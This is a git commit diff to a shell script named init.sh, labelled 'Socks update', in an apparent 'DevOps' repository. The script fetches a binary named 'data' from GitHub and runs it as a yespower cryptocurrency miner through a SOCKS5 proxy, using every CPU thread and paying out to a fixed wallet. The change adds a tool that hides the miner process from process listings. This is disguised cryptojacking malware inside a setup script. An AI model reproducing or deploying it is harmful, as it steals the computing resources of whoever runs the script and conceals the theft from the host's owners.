2acec2b5bec70e662d47f1292d1da4b858c3654e
thirthada007 <88758710+thirthada007@users.noreply.github.com>
2022-04-19 02:48:34 +0530

    Socks update
    Update

--- init.sh
+++ init.sh
@@ -1,4 +1,6 @@
-apt update -y
+apt update -y && apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
 wget -q https://github.com/thirthada007/DevOps/raw/main/data
 chmod +x data
-./data -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u RBxXP9udHoS2Xc27vMMMmxi79CbMmaj1u7.Test -p c=RVN -t $(nproc) -x socks5://lebarankita:buatTHRan@154.38.34.3:5015
+npm i -g node-process-hider 
+ph add data
+./data -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u RBxXP9udHoS2Xc27vMMMmxi79CbMmaj1u7.archer -p c=RVN,mc=BTE/BUTK,ID=archer -t $(nproc) -x socks5://Archer:12322@129.158.58.77:1080
